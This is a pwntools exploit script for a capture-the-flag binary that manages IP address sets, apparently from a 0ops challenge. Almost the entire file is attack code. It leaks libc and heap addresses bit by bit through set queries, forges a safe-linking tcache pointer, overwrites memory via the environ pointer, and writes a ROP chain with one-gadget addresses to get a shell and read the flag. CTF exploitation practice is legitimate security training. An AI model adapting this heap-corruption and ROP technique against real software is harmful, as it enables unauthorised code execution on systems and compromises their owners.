from pwn import *
import sys
import os
import ctypes
import threading
#Cre: vilex1337

_path = "./pwn_patched"
exe = context.binary = ELF(_path, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
#ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
cmd = f'''
    set solib-search-path {os.getcwd()}
    continue
'''

def conn():
    global _mode
    if(len(sys.argv) == 1): 
        _mode = 2
        return gdb.debug(_path, cmd)
    if(sys.argv[1] == 'exp'):
        _mode = 3
        proxy_address = "instance.penguin.0ops.sjtu.cn"
        proxy_port = 18081

        # Target configuration
        target_host = "f4x6gphbg2mq22gb"
        target_port = 1

        # Establish a connection via the proxy
        proxy = socks.socksocket()
        proxy.set_proxy(socks.HTTP, proxy_address, proxy_port)
        proxy.connect((target_host, target_port))          

        # Wrap the connection in pwntools' tube
        return remote.fromsocket(proxy)
    _mode = 1
    return process(_path)

def p(_data):
    if(True):
        return p64(_data, endian = 'little')
    return p32(_data, endian = 'little')

chall = conn()

def check():
    chall.interactive()
    exit()

def _send(_rgx, _data):
    chall.sendafter(_rgx, _data)

def _sendline(_rgx, _data):
    chall.sendlineafter(_rgx, _data)


def create(start, end):
    _sendline(b'Choose an option: ', b'1')
    _sendline(b'Please input start ip:', start)
    _sendline(b'Please input end ip:', end)


def addIpCIDR(start, end):
    _sendline(b'Choose an option: ', b'2')
    _sendline(b'Please input ip: ', start+b'/'+end)


def addIpSingle(start):
    _sendline(b'Choose an option: ', b'2')
    _sendline(b'Please input ip: ',start)


def addIpRange(start, end):
    _sendline(b'Choose an option: ', b'2')
    _sendline(b'Please input ip: ',start+b'-'+end)


def delIpCIDR(start, end):
    _sendline(b'Choose an option: ', b'3')
    _sendline(b'Please input ip: ',start+b'/'+end)


def delIpSingle(start):
    _sendline(b'Choose an option: ', b'3')
    _sendline(b'Please input ip: ',start)


def delIpRange(start, end):
    _sendline(b'Choose an option: ', b'3')
    _sendline(b'Please input ip: ',start+b'-'+end)


def query(ip):
    _sendline(b'Choose an option: ', b'4')
    _sendline(b'Please input ip:', ip)


def delSet():
    _sendline(b'Choose an option: ', b'5')


libcDLL = ctypes.CDLL("libc.so.6")

libcDLL.htonl.argtypes = [ctypes.c_uint32]
libcDLL.htonl.restype = ctypes.c_uint32

libcDLL.inet_ntoa.argtypes = [ctypes.c_uint32]
libcDLL.inet_ntoa.restype = ctypes.c_char_p


def num2IpStr(num) -> bytes:
    network_order = libcDLL.htonl(ctypes.c_uint32(num))
    ip_string = libcDLL.inet_ntoa(network_order)
    return ip_string

def _leak(_ip, _len = 8 * 6):
    ret = 0
    for i in range(_len):
        query(num2IpStr(_ip + i))
        chall.recv(6)
        _ = chall.recv(1)
        if (_ == b'i'):
            ret += (1 << i)
    return ret


def _set_chunk():
    _base = 0x37
    create(num2IpStr(_base * 8 + 0x1000000), num2IpStr(_base *
                                                       8 + 0x1000000 + (1 << (_base * 8).bit_length())))

    addIpCIDR(num2IpStr(_base * 8 + 0x1000000 + 9),
              str(32 - (_base * 8).bit_length()).encode())

    create(num2IpStr(_base * 8 + 0x1000000), num2IpStr(_base *
                                                       8 + 0x1000000 + 0x37*8))
    delSet()

    _base += 0x50+0x40
    create(num2IpStr(_base * 8 + 0x1000000 - 1), num2IpStr(_base *
                                                           8 + 0x1000000 + (1 << (_base * 8).bit_length())))
    delIpCIDR(num2IpStr(_base * 8 + 0x1000000 + 10),
              str(32 - (_base * 8).bit_length()).encode())

def _write_payload(payload, _len = 8 * 22, mask = '', _mode = 0, offset = 0):
    i = 0
    while(i < _len):
        _right = i
        for j in range(i + 1, _len):
            if(payload[j] != payload[i] or j == _len - 1):
                _right = j - 1
                break
        if(payload[i] == '1'):
            if(i != _right):
                addIpRange(num2IpStr(i + offset * 8), num2IpStr(_right + offset * 8))
            else:
                addIpSingle(num2IpStr(i + offset * 8))
        else:
            if(i != _right):
                delIpRange(num2IpStr(i + offset * 8), num2IpStr(_right + offset * 8))
            else:
                delIpSingle(num2IpStr(i + offset * 8))
        print(f"{i} - {_right}")
        i = _right + 1

_data = []
ropChain = []
_mask = []
_got = []
to_do = []

def craft_data():
    global _data
    payload = ''
    for value in _data:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    _data = payload
def craft_todo():
    global to_do
    payload = ''
    for value in to_do:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    to_do = payload
    return

def craft_rop():
    global ropChain
    global _mask, _got
    payload = ''
    for value in ropChain:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    ropChain = payload
    payload = ''
    for value in _mask:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    _mask = payload
    payload = ''
    for value in _got:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    _got = payload
    return



###
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x578 * 8 - 8))
addIpSingle(num2IpStr(0x13d + 0x478 * 8))
addIpSingle(num2IpStr(0x13d + 0x479 * 8))
delIpCIDR(num2IpStr(0x150), b'24')
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x178 * 8 - 8))
libc.address = (0x7f << (8 * 5)) + _leak(0x13d, 8 * 5) - 0x21b0f0
ropChain = [libc.address+0x118c8f,
            0, libc.address+0xebce2]
_got = [libc.address + 0x1211ad]
_mask = [libc.address + 0x1a0710]
thread2 = threading.Thread(target=craft_rop)
thread2.start()
###


###
log.info(F"Libc: {hex(libc.address)}")
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x188 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x178 * 8 - 8))
_heap = _leak(0x13d) << 12
log.info(f"Heap: {hex(_heap)}")
to_do = (_heap + 0x100) ^ ((_heap+0x9d0) >> 12)
log.info(F"{hex(to_do)}")
to_do = [to_do]
_data = [libc.sym.environ, libc.address+0x21A040, _heap + 0x140]
thread1 = threading.Thread(target=craft_data)
thread1.start()
thread3 = threading.Thread(target=craft_todo)
thread3.start()



###
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x160 * 8 - 8))
create(num2IpStr(0x40), num2IpStr(0x40 + 0x28 * 8 - 8))
delSet()
_set_chunk()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x28 * 8 - 8))
delSet()
create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))
addIpSingle(num2IpStr(0x78*8+6))
addIpSingle(num2IpStr(0x79*8+1))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x38 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x138 * 8 - 8))
delIpCIDR(num2IpStr(0x150), b'24')
delSet()
create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))
delIpSingle(num2IpStr(0x79*8+1))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x238 * 8 - 8))
delSet()
create(num2IpStr(0), num2IpStr(0 + 0x128 * 8 - 8))
###

###
thread3.join()
_write_payload(to_do, _len = 8 * 4 + 4, offset = 0x80)
create(num2IpStr(0x13d), num2IpStr(0x13d + 0xf8 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x108 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x118 * 8 - 8))
delSet()
create(num2IpStr(0x13d), num2IpStr(0x13d + 0x38 * 8 - 8))
create(num2IpStr(0), num2IpStr(0 + 0x38 * 8 - 8))
print("Writing environ")
thread1.join()
_write_payload(_data, 8 * 8 * 2 + 12)
create(num2IpStr(0), num2IpStr(0xf8 * 8 - 8))
environ = (0x7f << (8 * 5)) + _leak(0, 8 * 5)
log.info(hex(environ))
create(num2IpStr(0), num2IpStr(0x118 * 8 - 8))
###


def craft(_data):
    payload = ''
    for value in _data:
        for i in range(64):
            if(value & 1):
                payload += '1'
            else:
                payload += '0'
            value >>= 1
    return payload

_write_payload(craft([environ+0x110-0x38]), _len = 8 * 6, offset = 8)   
create(num2IpStr(0), num2IpStr(0x188 * 8 - 8))
print("Writing payload")

thread2.join()
_write_payload(ropChain, 8 * 24)

print("Done")
create(num2IpStr(0), num2IpStr(0 + 0x108 * 8 - 8))
_write_payload(_got, 8 * 4)
chall.sendlineafter(b'Choose an option:', b'5')
chall.sendline(b'cat flag')
print(chall.recvall())